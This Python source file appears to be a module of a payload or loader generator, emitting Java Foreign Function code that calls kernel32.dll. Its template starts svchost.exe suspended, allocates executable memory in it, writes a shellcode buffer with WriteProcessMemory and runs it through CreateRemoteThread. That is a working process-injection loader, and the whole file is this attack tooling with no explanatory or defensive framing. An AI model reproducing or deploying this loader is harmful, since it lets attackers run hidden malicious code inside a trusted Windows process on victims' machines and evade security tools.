class spawnandinject:
    def __init__(self, arguments):
        pass

    def imports(self) -> list[str]:
        return ["import java.lang.foreign.Arena;",
                "import java.lang.foreign.FunctionDescriptor;",
                "import java.lang.foreign.Linker;",
                "import java.lang.foreign.MemoryLayout;",
                "import java.lang.foreign.MemorySegment;",
                "import java.lang.foreign.SymbolLookup;",
                "import java.lang.foreign.ValueLayout;",
                "import java.lang.invoke.MethodHandle;",
                "import static java.lang.foreign.ValueLayout.*;",]

    def compilerOptions(self) -> list[str]:
        return ['{"returnType": "void*","parameterTypes": ["long long", "void*","size_t","int","int"]}',
                '{"returnType": "long long", "parameterTypes": ["long long", "void*", "size_t", "void*", "void*", "int", "void*"]}',
                '{"returnType": "int", "parameterTypes": ["long long", "int" ]}',
                '{"returnType": "bool", "parameterTypes": ["long long", "void*", "void*", "long long", "void*" ]}',
                '{"returnType": "bool", "parameterTypes": ["void*", "void*", "void*", "void*", "bool", "int", "void*", "void*", "void*", "void*" ]}']

    def codeblocks(self) -> str:
        return """
    private static final Linker LINKER = Linker.nativeLinker();
    private static final MemoryLayout C_INT     = LINKER.canonicalLayouts().get("int");
    private static final MemoryLayout C_LONG_LONG     = LINKER.canonicalLayouts().get("long long");
    private static final MemoryLayout C_POINTER = LINKER.canonicalLayouts().get("void*");
    private static final MemoryLayout C_BOOL = LINKER.canonicalLayouts().get("bool");
    public static Arena arena = Arena.ofConfined();
    public static SymbolLookup kernel32 = SymbolLookup.libraryLookup("kernel32.dll", arena);
    public static MethodHandle VirtualAllocEx = LINKER.downcallHandle(kernel32.find("VirtualAllocEx").orElseThrow(),FunctionDescriptor.of(C_POINTER, C_LONG_LONG, C_POINTER, C_LONG_LONG, C_INT, C_INT));
    public static MethodHandle WriteProcessMemory = LINKER.downcallHandle(kernel32.find("WriteProcessMemory").orElseThrow(),FunctionDescriptor.of(C_BOOL, C_LONG_LONG, C_POINTER, C_POINTER, C_LONG_LONG, C_POINTER));
    public static MethodHandle CreateRemoteThread = LINKER.downcallHandle(kernel32.find("CreateRemoteThread").orElseThrow(),FunctionDescriptor.of(C_LONG_LONG, C_LONG_LONG, C_POINTER, C_LONG_LONG, C_POINTER, C_POINTER, C_INT, C_POINTER));
    public static MethodHandle WaitForSingleObject = LINKER.downcallHandle(kernel32.find("WaitForSingleObject").orElseThrow(),FunctionDescriptor.of(C_INT, C_LONG_LONG, C_INT));
    public static MethodHandle CreateProcessA = LINKER.downcallHandle(kernel32.find("CreateProcessA").orElseThrow(),FunctionDescriptor.of(C_BOOL, C_POINTER, C_POINTER, C_POINTER, C_POINTER, C_BOOL, C_INT, C_POINTER, C_POINTER, C_POINTER, C_POINTER));    
"""

    def template(self) -> str:
        return """
        {transformers}

        MemorySegment cmdline = arena.allocateFrom("C:\\\\windows\\\\system32\\\\svchost.exe");

        MemorySegment si = arena.allocate(104);
        MemorySegment pi = arena.allocate(24);
        
        boolean created = (boolean) CreateProcessA.invokeExact(MemorySegment.NULL, cmdline, MemorySegment.NULL, MemorySegment.NULL, false, 0x4, MemorySegment.NULL, MemorySegment.NULL, si, pi);

        long hProcess = pi.get(ValueLayout.JAVA_LONG, 0);

        MemorySegment address = (MemorySegment) VirtualAllocEx.invokeExact(hProcess, MemorySegment.NULL, (long)shellcode.length, 0x3000, 0x40);

        address = address.reinterpret(shellcode.length);

        MemorySegment nativeSegment = arena.allocate(shellcode.length);
        MemorySegment.copy(MemorySegment.ofArray(shellcode), 0, nativeSegment, 0, shellcode.length);

        boolean written = (boolean) WriteProcessMemory.invokeExact(hProcess, address, nativeSegment, (long)shellcode.length, MemorySegment.NULL);

        long hThread = (long) CreateRemoteThread.invokeExact(hProcess, MemorySegment.NULL, (long)0, address, MemorySegment.NULL, 0, MemorySegment.NULL);

        int result = (int) WaitForSingleObject.invokeExact(hThread, 500);
        
"""